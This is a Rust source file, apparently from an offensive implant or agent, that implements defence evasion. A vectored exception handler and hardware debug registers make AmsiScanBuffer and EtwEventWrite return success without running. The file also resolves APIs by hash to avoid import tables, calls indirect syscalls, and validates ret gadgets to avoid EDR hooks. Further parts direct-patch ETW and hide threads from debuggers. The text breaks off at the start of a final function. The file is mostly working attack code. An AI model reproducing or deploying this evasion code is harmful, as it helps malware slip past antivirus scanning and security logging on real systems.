//! Evasion mechanisms including HWBP-based AMSI/ETW bypass, PPID spoofing, argument spoofing, and callback execution.
//!
//! # Operation
//! - HWBP AMSI/ETW Bypass: Uses thread context hardware debug registers (Dr0-Dr3) to intercept execution at AMSI/ETW boundaries.
//! - PPID Spoofing: Manipulates thread attributes during process creation to masquerade the parent process.
//! - Argument Spoofing: Modifies the PEB command line at runtime.
//!
//! # Required Privileges
//! Standard user privileges are generally sufficient, though certain target processes for PPID spoofing may require SeDebugPrivilege.
//!
//! # Compatibility
//! Windows 10+ only (relies on specific offsets and newer thread context manipulation APIs).

#[cfg(windows)]
use std::sync::atomic::{AtomicUsize, Ordering};

#[cfg(windows)]
static AMSI_ADDR: AtomicUsize = AtomicUsize::new(0);
#[cfg(windows)]
static ETW_ADDR: AtomicUsize = AtomicUsize::new(0);
/// Pre-computed address of a `ret` (0xC3) gadget found during
/// `setup_hardware_breakpoints`.  Using a static avoids any memory scan or
/// NtQueryVirtualMemory call from inside the VEH handler, where those calls risk
/// deadlock (loader lock / heap lock contention).
#[cfg(windows)]
static RET_GADGET: AtomicUsize = AtomicUsize::new(0);

#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn context_ip(context: *mut winapi::um::winnt::CONTEXT) -> usize {
    (*context).Rip as usize
}

#[cfg(all(windows, target_arch = "aarch64"))]
unsafe fn context_ip(context: *mut winapi::um::winnt::CONTEXT) -> usize {
    (*context).Pc as usize
}

#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn context_set_return_success_and_redirect(
    context: *mut winapi::um::winnt::CONTEXT,
    gadget: usize,
) {
    (*context).Rax = 0;
    (*context).Rip = gadget as u64;
}

#[cfg(all(windows, target_arch = "aarch64"))]
unsafe fn context_set_return_success_and_redirect(
    context: *mut winapi::um::winnt::CONTEXT,
    gadget: usize,
) {
    (*context).u.s_mut().X0 = 0;
    (*context).Pc = gadget as u64;
}

#[cfg(all(windows, target_arch = "x86_64"))]
fn hwbp_set_slots(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
    ctx.Dr0 = amsi as u64;
    ctx.Dr1 = etw as u64;
    ctx.Dr7 |= (1 << 0) | (1 << 2);
}

#[cfg(all(windows, target_arch = "aarch64"))]
fn hwbp_set_slots(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
    const ARM64_BCR_EL0_EXECUTE: u32 = 0x5;
    ctx.Bvr[0] = amsi as u64;
    ctx.Bvr[1] = etw as u64;
    ctx.Bcr[0] = ARM64_BCR_EL0_EXECUTE;
    ctx.Bcr[1] = ARM64_BCR_EL0_EXECUTE;
}

#[cfg(all(windows, target_arch = "x86_64"))]
fn hwbp_slots_match(
    actual: &winapi::um::winnt::CONTEXT,
    expected: &winapi::um::winnt::CONTEXT,
) -> bool {
    actual.Dr0 == expected.Dr0
        && actual.Dr1 == expected.Dr1
        && (actual.Dr7 & ((1 << 0) | (1 << 2))) == (expected.Dr7 & ((1 << 0) | (1 << 2)))
}

#[cfg(all(windows, target_arch = "aarch64"))]
fn hwbp_slots_match(
    actual: &winapi::um::winnt::CONTEXT,
    expected: &winapi::um::winnt::CONTEXT,
) -> bool {
    actual.Bvr[0] == expected.Bvr[0]
        && actual.Bvr[1] == expected.Bvr[1]
        && (actual.Bcr[0] & 1) == (expected.Bcr[0] & 1)
        && (actual.Bcr[1] & 1) == (expected.Bcr[1] & 1)
}

#[cfg(all(windows, target_arch = "x86_64"))]
fn hwbp_slot_values(ctx: &winapi::um::winnt::CONTEXT) -> (u64, u64) {
    (ctx.Dr0, ctx.Dr1)
}

#[cfg(all(windows, target_arch = "aarch64"))]
fn hwbp_slot_values(ctx: &winapi::um::winnt::CONTEXT) -> (u64, u64) {
    (ctx.Bvr[0], ctx.Bvr[1])
}

#[cfg(all(windows, target_arch = "x86_64"))]
fn hwbp_clear_if_owned(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
    if (ctx.Dr0 == amsi as u64) || (ctx.Dr1 == etw as u64) {
        ctx.Dr0 = 0;
        ctx.Dr1 = 0;
        ctx.Dr7 &= !((1u64 << 0) | (1u64 << 2));
    }
}

#[cfg(all(windows, target_arch = "aarch64"))]
fn hwbp_clear_if_owned(ctx: &mut winapi::um::winnt::CONTEXT, amsi: usize, etw: usize) {
    if (ctx.Bvr[0] == amsi as u64) || (ctx.Bvr[1] == etw as u64) {
        ctx.Bvr[0] = 0;
        ctx.Bvr[1] = 0;
        ctx.Bcr[0] &= !1;
        ctx.Bcr[1] &= !1;
    }
}

#[cfg(all(windows, target_arch = "x86_64"))]
fn hwbp_restore_slots(ctx: &mut winapi::um::winnt::CONTEXT, saved: &SavedDebugRegs) {
    ctx.Dr0 = saved.dr0;
    ctx.Dr1 = saved.dr1;
    if saved.dr0 != 0 {
        ctx.Dr7 |= 1 << 0;
    }
    if saved.dr1 != 0 {
        ctx.Dr7 |= 1 << 2;
    }
}

#[cfg(all(windows, target_arch = "aarch64"))]
fn hwbp_restore_slots(ctx: &mut winapi::um::winnt::CONTEXT, saved: &SavedDebugRegs) {
    const ARM64_BCR_EL0_EXECUTE: u32 = 0x5;
    ctx.Bvr[0] = saved.dr0;
    ctx.Bvr[1] = saved.dr1;
    ctx.Bcr[0] = if saved.dr0 != 0 {
        ARM64_BCR_EL0_EXECUTE
    } else {
        0
    };
    ctx.Bcr[1] = if saved.dr1 != 0 {
        ARM64_BCR_EL0_EXECUTE
    } else {
        0
    };
}

/// Handle returned by `AddVectoredExceptionHandler`, stored as a `usize`.
/// Zero means no handler is registered.  Uses `AtomicUsize` (not `OnceLock`)
/// so that `disable_evasion` can reset it after removal.
#[cfg(windows)]
static VEH_HANDLE: AtomicUsize = AtomicUsize::new(0);

#[cfg(windows)]
unsafe extern "system" fn veh_handler(
    exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
) -> i32 {
    let record = (*exception_info).ExceptionRecord;
    let context = (*exception_info).ContextRecord;

    if (*record).ExceptionCode == winapi::um::winnt::STATUS_SINGLE_STEP {
        let ip = context_ip(context);
        let amsi = AMSI_ADDR.load(Ordering::Relaxed);
        let etw = ETW_ADDR.load(Ordering::Relaxed);

        if (amsi != 0 && ip == amsi) || (etw != 0 && ip == etw) {
            // Bypass by clearing the ABI return register and advancing IP to a
            // pre-computed ret gadget.  The gadget address was resolved and
            // validated with NtQueryVirtualMemory during setup_hardware_breakpoints,
            // before this handler was registered.  Scanning memory or calling
            // NtQueryVirtualMemory here would risk deadlock (loader-lock / heap-lock
            // contention inside a VEH handler).
            let gadget = RET_GADGET.load(Ordering::Relaxed);
            if gadget == 0 {
                // Gadget was not resolved at setup time; propagate the exception.
                return winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH;
            }
            context_set_return_success_and_redirect(context, gadget);
            return winapi::vc::excpt::EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    winapi::vc::excpt::EXCEPTION_CONTINUE_SEARCH
}

#[cfg(windows)]
pub unsafe fn setup_hardware_breakpoints() {
    use winapi::um::handleapi::INVALID_HANDLE_VALUE;
    use winapi::um::winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS};

    /// Minimal thread access for hardware breakpoints: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
    const THREAD_BP_ACCESS: u64 = 0x1A02;

    // ── Dynamic resolution helpers (no IAT entries) ──────────────────────
    // VEH registration / removal and thread enumeration are resolved at
    // runtime via PE export-table hashing so no import-table entries are
    // created for these heavily-signatured APIs.

    type AddVehFn = unsafe extern "system" fn(
        u32,
        Option<unsafe extern "system" fn(*mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32>,
    ) -> *mut std::ffi::c_void;

    let add_veh: Option<AddVehFn> = (|| unsafe {
        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
        let hash = pe_resolve::hash_str(b"AddVectoredExceptionHandler\0");
        let addr = pe_resolve::get_proc_address_by_hash(k32, hash)?;
        Some(std::mem::transmute::<usize, AddVehFn>(addr))
    })();

    type CreateSnapshotFn = unsafe extern "system" fn(u32, u32) -> winapi::um::winnt::HANDLE;
    type Thread32FirstFn = unsafe extern "system" fn(
        winapi::um::winnt::HANDLE,
        *mut winapi::um::tlhelp32::THREADENTRY32,
    ) -> i32;
    type Thread32NextFn = unsafe extern "system" fn(
        winapi::um::winnt::HANDLE,
        *mut winapi::um::tlhelp32::THREADENTRY32,
    ) -> i32;

    let (create_snapshot, thread32_first, thread32_next): (
        Option<CreateSnapshotFn>,
        Option<Thread32FirstFn>,
        Option<Thread32NextFn>,
    ) = match (|| unsafe {
        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
        let snap_hash = pe_resolve::hash_str(b"CreateToolhelp32Snapshot\0");
        let first_hash = pe_resolve::hash_str(b"Thread32First\0");
        let next_hash = pe_resolve::hash_str(b"Thread32Next\0");
        let snap_addr = pe_resolve::get_proc_address_by_hash(k32, snap_hash)?;
        let first_addr = pe_resolve::get_proc_address_by_hash(k32, first_hash)?;
        let next_addr = pe_resolve::get_proc_address_by_hash(k32, next_hash)?;
        Some((
            std::mem::transmute::<usize, CreateSnapshotFn>(snap_addr),
            std::mem::transmute::<usize, Thread32FirstFn>(first_addr),
            std::mem::transmute::<usize, Thread32NextFn>(next_addr),
        ))
    })() {
        Some((snap, first, next)) => (Some(snap), Some(first), Some(next)),
        None => (None, None, None),
    };

    type NtGetContextThreadFn =
        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;
    type NtSetContextThreadFn =
        unsafe extern "system" fn(winapi::um::winnt::HANDLE, *mut CONTEXT) -> i32;

    let mut nt_get_context_thread: Option<NtGetContextThreadFn> = None;
    let mut nt_set_context_thread: Option<NtSetContextThreadFn> = None;

    let mut configured = false;

    let amsi: *mut winapi::ctypes::c_void =
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_AMSI_DLL).unwrap_or(0) as *mut _;
    if !amsi.is_null() {
        let addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(amsi as usize, pe_resolve::HASH_AMSISCANBUFFER)
                .unwrap_or(0) as *mut _;
        if !addr.is_null() {
            AMSI_ADDR.store(addr as usize, Ordering::Relaxed);
            configured = true;
        }
    }

    let ntdll: *mut winapi::ctypes::c_void =
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as *mut _;
    if !ntdll.is_null() {
        let addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_ETWEVENTWRITE)
                .unwrap_or(0) as *mut _;
        if !addr.is_null() {
            ETW_ADDR.store(addr as usize, Ordering::Relaxed);
            configured = true;
        }

        let nt_get_hash = pe_resolve::hash_str(b"NtGetContextThread\0");
        let nt_set_hash = pe_resolve::hash_str(b"NtSetContextThread\0");

        let nt_get_addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(ntdll as usize, nt_get_hash).unwrap_or(0) as _;
        if !nt_get_addr.is_null() {
            nt_get_context_thread = Some(std::mem::transmute(nt_get_addr));
        }

        let nt_set_addr: *mut winapi::ctypes::c_void =
            pe_resolve::get_proc_address_by_hash(ntdll as usize, nt_set_hash).unwrap_or(0) as _;
        if !nt_set_addr.is_null() {
            nt_set_context_thread = Some(std::mem::transmute(nt_set_addr));
        }

        // Pre-compute a `ret` gadget from NtClose so that veh_handler never
        // needs to scan memory or call NtQueryVirtualMemory at exception time.
        // NtQueryVirtualMemory is safe here (not inside a VEH handler).
        'gadget: {
            use winapi::um::winnt::{
                IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, MEMORY_BASIC_INFORMATION, MEM_COMMIT,
                PAGE_EXECUTE_READ,
            };

            // Compute ntdll's address range for gadget validation.
            let ntdll_base = ntdll as usize;
            let mut ntdll_end: usize = 0;
            {
                let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
                let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
                ntdll_end = ntdll_base + nt.OptionalHeader.SizeOfImage as usize;
            }

            let nt_close_raw =
                pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTCLOSE)
                    .unwrap_or(0);
            if nt_close_raw == 0 {
                break 'gadget;
            }

            // Follow inline hook trampolines (same bounded-depth logic that
            // was previously inside veh_handler) to reach the real stub.
            let mut p = nt_close_raw as *const u8;
            const MAX_DEPTH: usize = 3;
            for _ in 0..MAX_DEPTH {
                // Verify the current byte is readable before peeking at the opcode.
                let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
                let mut return_len: usize = 0;
                let vq_status = crate::syscall!(
                    "NtQueryVirtualMemory",
                    -1i64 as u64,              // NtCurrentProcess()
                    p as u64,                  // BaseAddress
                    0u64,                      // MemoryBasicInformation
                    &mut mbi as *mut _ as u64, // Buffer
                    std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as u64, // Length
                    &mut return_len as *mut _ as u64, // ReturnLength
                );
                if vq_status.is_err() || vq_status.unwrap() < 0 || mbi.State != MEM_COMMIT {
                    break 'gadget;
                }

                if *p == 0xFF && *p.add(1) == 0x25 {
                    let disp = std::ptr::read_unaligned(p.add(2) as *const i32);
                    let slot = (p as usize)
                        .wrapping_add(6)
                        .wrapping_add(disp as isize as usize);
                    let target = std::ptr::read_unaligned(slot as *const usize);
                    if target == 0 {
                        break 'gadget;
                    }
                    p = target as *const u8;
                } else if *p == 0xE9 {
                    let disp = std::ptr::read_unaligned(p.add(1) as *const i32);
                    let target = (p as usize)
                        .wrapping_add(5)
                        .wrapping_add(disp as isize as usize);
                    if target == 0 {
                        break 'gadget;
                    }
                    p = target as *const u8;
                } else {
                    break; // not a trampoline; scan from here
                }
            }

            // Scan up to 64 bytes for a return instruction, verifying each page with
            // NtQueryVirtualMemory before the first dereference on that page.
            let mut last_page: usize = usize::MAX;
            for _ in 0..64usize {
                let addr = p as usize;
                let page = addr & !0xFFF_usize;
                if page != last_page {
                    // New page: verify it is committed and readable/executable.
                    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
                    let mut return_len: usize = 0;
                    let vq_status = crate::syscall!(
                        "NtQueryVirtualMemory",
                        -1i64 as u64,              // NtCurrentProcess()
                        p as u64,                  // BaseAddress
                        0u64,                      // MemoryBasicInformation
                        &mut mbi as *mut _ as u64, // Buffer
                        std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as u64, // Length
                        &mut return_len as *mut _ as u64, // ReturnLength
                    );
                    if vq_status.is_err() || vq_status.unwrap() < 0 || mbi.State != MEM_COMMIT {
                        break 'gadget;
                    }
                    // Require at least PAGE_EXECUTE_READ.
                    let prot = mbi.Protect & 0xFF; // mask off guard/nocache modifiers
                    if prot < PAGE_EXECUTE_READ {
                        break 'gadget;
                    }
                    last_page = page;
                }

                #[cfg(target_arch = "x86_64")]
                {
                    if *p == 0xC3 {
                        // `ret` is 1 byte — always within its page.
                        // Validate the gadget is within ntdll's address range.
                        // A hooked NtClose may redirect us to EDR memory where a
                        // ret gadget would be a strong detection signal.
                        if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
                            log::warn!("evasion: ret gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
                            p = p.add(1);
                            continue;
                        }
                        RET_GADGET.store(addr, Ordering::Relaxed);
                        log::debug!("evasion: ret gadget pre-computed at {:#x}", addr);
                        break 'gadget;
                    }

                    // Skip 0xC2 (ret N, 3 bytes) if it would straddle a page boundary.
                    if *p == 0xC2 {
                        if addr + 3 <= (page + 0x1000) {
                            // Validate the gadget is within ntdll's address range.
                            if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
                                log::warn!("evasion: ret-N gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
                                p = p.add(1);
                                continue;
                            }
                            RET_GADGET.store(addr, Ordering::Relaxed);
                            log::debug!("evasion: ret-N gadget pre-computed at {:#x}", addr);
                        }
                        break 'gadget;
                    }

                    p = p.add(1);
                }

                #[cfg(target_arch = "aarch64")]
                {
                    if addr % 4 == 0 && addr + 4 <= (page + 0x1000) {
                        let insn = std::ptr::read_unaligned(p as *const u32);
                        if insn == 0xD65F_03C0 {
                            if ntdll_end > 0 && (addr < ntdll_base || addr >= ntdll_end) {
                                log::warn!("evasion: ARM64 ret gadget at {:#x} is outside ntdll range [{:#x},{:#x}) — possible EDR hook, skipping", addr, ntdll_base, ntdll_end);
                                p = p.add(4);
                                continue;
                            }
                            RET_GADGET.store(addr, Ordering::Relaxed);
                            log::debug!("evasion: ARM64 ret gadget pre-computed at {:#x}", addr);
                            break 'gadget;
                        }
                    }

                    p = p.add(if addr % 4 == 0 { 4 } else { 4 - (addr % 4) });
                }

                #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
                {
                    p = p.add(1);
                }
            }

            // Fallback: if no valid ntdll ret gadget was found, resolve
            // RtlGetCurrentPeb which always ends with a `ret`.
            if RET_GADGET.load(Ordering::Relaxed) == 0 {
                let peb_fn = pe_resolve::get_proc_address_by_hash(
                    ntdll_base,
                    pe_resolve::hash_str(b"RtlGetCurrentPeb\0"),
                )
                .unwrap_or(0);
                if peb_fn != 0 {
                    // RtlGetCurrentPeb is a tiny leaf routine that ends with ret.
                    let q = peb_fn as *const u8;
                    for i in 0..16usize {
                        #[cfg(target_arch = "x86_64")]
                        let found = *q.add(i) == 0xC3;
                        #[cfg(target_arch = "aarch64")]
                        let found = i % 4 == 0
                            && std::ptr::read_unaligned(q.add(i) as *const u32) == 0xD65F_03C0;
                        #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
                        let found = false;

                        if found {
                            let gadget = peb_fn + i;
                            // Verify it's within ntdll (should always be).
                            if ntdll_end == 0 || (gadget >= ntdll_base && gadget < ntdll_end) {
                                RET_GADGET.store(gadget, Ordering::Relaxed);
                                log::debug!(
                                    "evasion: ret gadget fallback from RtlGetCurrentPeb at {:#x}",
                                    gadget
                                );
                            }
                            break;
                        }
                    }
                }
            }
        } // end 'gadget
    }

    if nt_set_context_thread.is_some() {
        log::debug!("evasion: using NtSetContextThread for debug register modification");
    } else {
        log::debug!("evasion: NtSetContextThread not available, falling back to SetThreadContext");
        log::warn!(
            "evasion: SetThreadContext fallback path in use for debug register modification"
        );
    }

    if !configured {
        return;
    }

    // Register our VEH first; store the handle so it can be removed later
    // via RemoveVectoredExceptionHandler (see disable_evasion).
    if let Some(add_veh_fn) = add_veh {
        let veh = add_veh_fn(1, Some(veh_handler));
        if !veh.is_null() {
            VEH_HANDLE.store(veh as usize, Ordering::Release);
        }
    }

    // Propagate hardware breakpoints to all existing threads in the process
    // GetCurrentProcessId → NtQueryInformationProcess(ProcessBasicInformation)
    #[repr(C)]
    struct Pbi {
        reserved1: *mut std::ffi::c_void,
        peb_base_address: *mut std::ffi::c_void,
        reserved2: [*mut std::ffi::c_void; 2],
        unique_process_id: usize,
        inherited_from_unique_process_id: usize,
    }
    let mut pbi: Pbi = std::mem::zeroed();
    let _ = crate::syscall!(
        "NtQueryInformationProcess",
        (-1isize) as u64, // NtCurrentProcess()
        0u64,             // ProcessBasicInformation
        &mut pbi as *mut _ as u64,
        std::mem::size_of::<Pbi>() as u64,
        std::ptr::null_mut::<u64>() as u64,
    );
    let pid = pbi.unique_process_id as u32;
    // TH32CS_SNAPTHREAD = 0x00000004
    let snapshot = create_snapshot.map_or(INVALID_HANDLE_VALUE, |f| f(0x00000004, 0));
    if snapshot != INVALID_HANDLE_VALUE {
        let mut te32: winapi::um::tlhelp32::THREADENTRY32 = std::mem::zeroed();
        te32.dwSize = std::mem::size_of::<winapi::um::tlhelp32::THREADENTRY32>() as u32;

        if thread32_first.map_or(0, |f| f(snapshot, &mut te32)) != 0 {
            loop {
                if te32.th32OwnerProcessID == pid {
                    // OpenThread → NtOpenThread (indirect syscall)
                    let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
                    oa.Length =
                        std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
                    let mut cid: [u64; 2] = [pid as u64, te32.th32ThreadID as u64];
                    let mut h_thread: usize = 0;
                    let open_ok = crate::syscall!(
                        "NtOpenThread",
                        &mut h_thread as *mut _ as u64,
                        THREAD_BP_ACCESS as u64,
                        &mut oa as *mut _ as u64,
                        cid.as_mut_ptr() as u64,
                    );
                    let h_thread = h_thread as winapi::um::winnt::HANDLE;
                    if open_ok.is_ok() && open_ok.unwrap() >= 0 && !h_thread.is_null() {
                        // (1) SuspendThread → NtSuspendThread
                        let mut prev_suspend: u32 = 0;
                        let susp_status = crate::syscall!(
                            "NtSuspendThread",
                            h_thread as u64,
                            &mut prev_suspend as *mut u32 as u64,
                        );
                        if susp_status.is_err() || susp_status.unwrap() < 0 {
                            log::warn!(
                                "evasion: NtSuspendThread failed for tid {} — skipping context modification",
                                te32.th32ThreadID
                            );
                            let _ = crate::syscall!("NtClose", h_thread as u64);
                            if thread32_next.map_or(0, |f| f(snapshot, &mut te32)) == 0 {
                                break;
                            }
                            continue;
                        }

                        // (5) Save original context for restoration on error.
                        let mut orig_ctx: CONTEXT = std::mem::zeroed();
                        orig_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                        let got_ctx_fallback = {
                            let s = crate::syscall!(
                                "NtGetContextThread",
                                h_thread as u64,
                                &mut orig_ctx as *mut _ as u64,
                            );
                            s.is_ok() && s.unwrap() >= 0
                        };
                        let _orig_saved = if let Some(nt_get_ctx) = nt_get_context_thread {
                            let status = nt_get_ctx(h_thread, &mut orig_ctx);
                            if status >= 0 {
                                true
                            } else {
                                got_ctx_fallback
                            }
                        } else {
                            got_ctx_fallback
                        };

                        // (2) GetThreadContext: returns 0 on failure.
                        let mut ctx: CONTEXT = std::mem::zeroed();
                        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                        let ctx_fallback = {
                            let s = crate::syscall!(
                                "NtGetContextThread",
                                h_thread as u64,
                                &mut ctx as *mut _ as u64,
                            );
                            s.is_ok() && s.unwrap() >= 0
                        };
                        let got_context = if let Some(nt_get_ctx) = nt_get_context_thread {
                            let status = nt_get_ctx(h_thread, &mut ctx);
                            if status >= 0 {
                                true
                            } else {
                                log::warn!(
                                        "evasion: NtGetContextThread failed for tid {} (status=0x{:08x}), falling back to syscall",
                                        te32.th32ThreadID,
                                        status as u32
                                    );
                                ctx_fallback
                            }
                        } else {
                            ctx_fallback
                        };

                        if !got_context {
                            log::warn!(
                                "evasion: GetThreadContext failed for tid {} — restoring suspension and skipping",
                                te32.th32ThreadID
                            );
                            // ResumeThread → NtResumeThread
                            let _ = crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
                            let _ = crate::syscall!("NtClose", h_thread as u64);
                            if thread32_next.map_or(0, |f| f(snapshot, &mut te32)) == 0 {
                                break;
                            }
                            continue;
                        }

                        hwbp_set_slots(
                            &mut ctx,
                            AMSI_ADDR.load(Ordering::Relaxed),
                            ETW_ADDR.load(Ordering::Relaxed),
                        );

                        let set_fallback = {
                            let s = crate::syscall!(
                                "NtSetContextThread",
                                h_thread as u64,
                                &mut ctx as *mut _ as u64,
                            );
                            s.is_ok() && s.unwrap() >= 0
                        };
                        let set_ok = if let Some(nt_set_ctx) = nt_set_context_thread {
                            let status = nt_set_ctx(h_thread, &mut ctx);
                            if status < 0 {
                                log::warn!(
                                        "evasion: NtSetContextThread failed for tid {} (status=0x{:08x}), falling back to syscall",
                                        te32.th32ThreadID,
                                        status as u32
                                    );
                                set_fallback
                            } else {
                                true
                            }
                        } else {
                            set_fallback
                        };

                        // (3) Verify SetThreadContext by re-reading and comparing Dr0/Dr1/Dr7.
                        if set_ok {
                            let mut verify_ctx: CONTEXT = std::mem::zeroed();
                            verify_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                            let verify_fallback = {
                                let s = crate::syscall!(
                                    "NtGetContextThread",
                                    h_thread as u64,
                                    &mut verify_ctx as *mut _ as u64,
                                );
                                s.is_ok() && s.unwrap() >= 0
                            };
                            let verify_ok = if let Some(nt_get_ctx) = nt_get_context_thread {
                                let status = nt_get_ctx(h_thread, &mut verify_ctx);
                                if status >= 0 {
                                    true
                                } else {
                                    verify_fallback
                                }
                            } else {
                                verify_fallback
                            };

                            if !verify_ok || !hwbp_slots_match(&verify_ctx, &ctx) {
                                let (actual0, actual1) = hwbp_slot_values(&verify_ctx);
                                let (expected0, expected1) = hwbp_slot_values(&ctx);
                                log::warn!(
                                    "evasion: SetThreadContext verification failed for tid {} — HWBP0={:#x} (expected {:#x}), HWBP1={:#x} (expected {:#x}), restoring original context",
                                    te32.th32ThreadID,
                                    actual0, expected0,
                                    actual1, expected1,
                                );
                                // Restore original debug registers.
                                if _orig_saved {
                                    let _ = if let Some(nt_set_ctx) = nt_set_context_thread {
                                        nt_set_ctx(h_thread, &mut orig_ctx)
                                    } else {
                                        let s = crate::syscall!(
                                            "NtSetContextThread",
                                            h_thread as u64,
                                            &mut orig_ctx as *mut _ as u64,
                                        );
                                        if s.is_ok() && s.unwrap() >= 0 {
                                            0i32
                                        } else {
                                            -1i32
                                        }
                                    };
                                }
                            }
                        } else {
                            log::warn!(
                                "evasion: SetThreadContext failed for tid {} — debug registers not modified",
                                te32.th32ThreadID
                            );
                        }

                        // (4) ResumeThread → NtResumeThread
                        let resume_status =
                            crate::syscall!("NtResumeThread", h_thread as u64, 0u64);
                        if resume_status.is_err() || resume_status.unwrap() < 0 {
                            log::error!(
                                "evasion: NtResumeThread failed for tid {} — thread may be left in suspended state!",
                                te32.th32ThreadID
                            );
                        }
                        let _ = crate::syscall!("NtClose", h_thread as u64);
                    }
                }
                if thread32_next.map_or(0, |f| f(snapshot, &mut te32)) == 0 {
                    break;
                }
            }
        }
        let _ = crate::syscall!("NtClose", snapshot as u64);
    }
}

// Backward compatibility for existing patch functions in lib.rs
#[cfg(windows)]
pub unsafe fn patch_amsi() {
    setup_hardware_breakpoints();
}

#[cfg(not(windows))]
/// # Safety
///
/// No-op stub on non-Windows; always safe to call.
pub unsafe fn patch_amsi() {}

/// Apply the ETW bypass using the method and mode configured in the agent config.
///
/// Defaults to [`common::config::EtwPatchMethod::Direct`] when `method` is
/// `None`, which overwrites the ETW function entry points with `ret` (0xC3).
/// When `Hwbp` is selected the existing hardware-breakpoint VEH approach is
/// used instead.  Both approaches may be layered: if direct patching fails
/// (e.g. `VirtualProtect` is blocked by CFG), the caller should fall back to
/// `setup_hardware_breakpoints()` independently.
///
/// `mode` controls whether the direct-patch is applied on newer Windows builds
/// (see [`common::config::EtwPatchMode`]).  Defaults to `Safe` when `None`.
///
/// # Safety
///
/// Modifies process state; see [`crate::etw_patch::patch_etw`] and
/// [`setup_hardware_breakpoints`] for their respective safety requirements.
pub unsafe fn setup_etw_patch(
    method: Option<&common::config::EtwPatchMethod>,
    mode: Option<&common::config::EtwPatchMode>,
) {
    use common::config::EtwPatchMethod;
    let mode = mode.cloned().unwrap_or_default();
    match method.unwrap_or(&EtwPatchMethod::Direct) {
        EtwPatchMethod::Direct => {
            if let Err(e) = crate::etw_patch::patch_etw_with_mode(mode) {
                log::warn!("etw_patch: direct patch failed: {}", e);
            }
        }
        EtwPatchMethod::Hwbp => {
            #[cfg(windows)]
            setup_hardware_breakpoints();
        }
        EtwPatchMethod::HwBpHook => {
            // General-purpose hw-bp-hook framework (invisible hooks via Dr0–Dr3).
            // Falls back to direct patching if the feature is not compiled in or
            // if all debug register slots are occupied.
            #[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
            {
                if crate::hw_bp_hook::install_etw_bypass() {
                    log::debug!("etw_patch: hw-bp-hook ETW bypass installed");
                } else {
                    log::warn!("etw_patch: hw-bp-hook ETW bypass failed; falling back to direct patch");
                    if let Err(e) = crate::etw_patch::patch_etw_with_mode(mode) {
                        log::warn!("etw_patch: direct patch fallback also failed: {}", e);
                    }
                }
            }
            #[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
            {
                log::warn!("etw_patch: HwBpHook method requested but hw-bp-hook feature not compiled; falling back to direct patch");
                if let Err(e) = crate::etw_patch::patch_etw_with_mode(mode) {
                    log::warn!("etw_patch: direct patch fallback failed: {}", e);
                }
            }
        }
    }
}

#[cfg(windows)]
pub fn hide_current_thread() {
    unsafe {
        let ntdll: *mut winapi::ctypes::c_void =
            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
        if !ntdll.is_null() {
            let func: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash(
                ntdll as usize,
                pe_resolve::HASH_NTSETINFORMATIONTHREAD,
            )
            .unwrap_or(0) as _;
            if !func.is_null() {
                let nt_set_info_thread: extern "system" fn(
                    winapi::um::winnt::HANDLE,
                    u32,
                    *mut winapi::ctypes::c_void,
                    u32,
                ) -> i32 = std::mem::transmute(func);
                nt_set_info_thread(
                    -2isize as winapi::um::winnt::HANDLE, // GetCurrentThread()
                    0x11,                                 // ThreadHideFromDebugger
                    std::ptr::null_mut(),
                    0,
                );
            }
        }
    }
}

#[cfg(not(windows))]
pub fn hide_current_thread() {}

/// Apply hardware breakpoints for AMSI/ETW bypass to the *calling* thread.
/// Called automatically by [`spawn_hidden_thread`]; call this at the start of
/// any other thread that must also be covered by the HWBP bypass.
#[cfg(windows)]
pub unsafe fn apply_hwbp_to_current_thread() {
